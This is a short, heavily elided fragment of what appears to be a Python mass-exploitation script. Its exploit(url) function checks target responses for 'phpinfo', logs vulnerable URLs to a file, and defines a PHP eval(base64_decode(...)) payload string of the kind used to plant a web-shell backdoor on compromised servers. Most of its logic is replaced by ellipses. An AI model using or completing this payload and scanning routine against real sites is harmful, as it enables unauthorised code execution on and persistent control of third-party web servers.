...
def exploit(url):
        ...
        try:
                ...
                if "phpinfo" in text.text:
                        ...
                        wre.write(url+"\n")
                        wre.close()
                        data2 = "<?php eval('?>'.base64_decode('')); ?>"
